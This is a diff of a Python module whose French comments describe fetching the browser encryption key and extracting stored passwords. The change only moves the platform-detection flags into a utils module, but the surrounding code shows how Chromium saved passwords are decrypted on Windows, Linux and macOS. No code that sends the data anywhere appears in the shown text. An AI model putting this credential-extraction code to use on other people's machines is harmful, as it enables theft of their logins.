@@ -5,8 +5,8 @@ import json
 import base64
 import os
 import sqlite3
+import utils
 
-from main import IS_WINDOWS, IS_LINUX, IS_MAC
 from config import CHROMIUM_BROWSERS
 
 # Fonction pour récupérer la clé de chiffrement
@@ -16,16 +16,16 @@ def get_encryption_key(local_state_path):
             local_state = json.load(file)
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
 
-        if IS_WINDOWS:
+        if utils.IS_WINDOWS:
             import win32crypt
             return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-        elif IS_LINUX:
+        elif utils.IS_LINUX:
             return subprocess.check_output(
                 ["secret-tool", "lookup", "chrome", "os_crypt"]
             ).strip()
 
-        elif IS_MAC:
+        elif utils.IS_MAC:
             return (
                 subprocess.check_output(
                     [
@@ -64,9 +64,9 @@ def decrypt_password(encrypted_password, key):
 # Fonction pour extraire les mots de passe stockés
 def extract_passwords():
     for browser, paths in CHROMIUM_BROWSERS.items():
-        if IS_WINDOWS:
+        if utils.IS_WINDOWS:
             user_data_path = paths["windows"]
-        elif IS_LINUX:
+        elif utils.IS_LINUX:
             user_data_path = paths["linux"]
         else:
             user_data_path = paths["mac"]
